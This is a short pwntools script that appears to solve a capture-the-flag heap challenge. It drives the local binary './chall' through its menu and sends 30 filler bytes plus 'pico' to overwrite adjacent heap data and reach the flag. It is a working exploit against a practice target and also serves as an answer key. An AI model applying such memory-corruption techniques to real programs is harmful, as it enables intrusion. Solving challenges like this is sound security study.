from pwn import *

elf = ELF('./chall')
io = process(elf.path)
context.binary = elf

def choice(n):
    io.sendlineafter(b'Enter your choice: ', n)

choice(b'5')

choice(b'2')
io.sendlineafter(b'Size of object allocation: ', b'35')
io.sendlineafter(b'Data for flag: ', b'a'*30 + b'pico')

choice(b'4')

io.interactive()
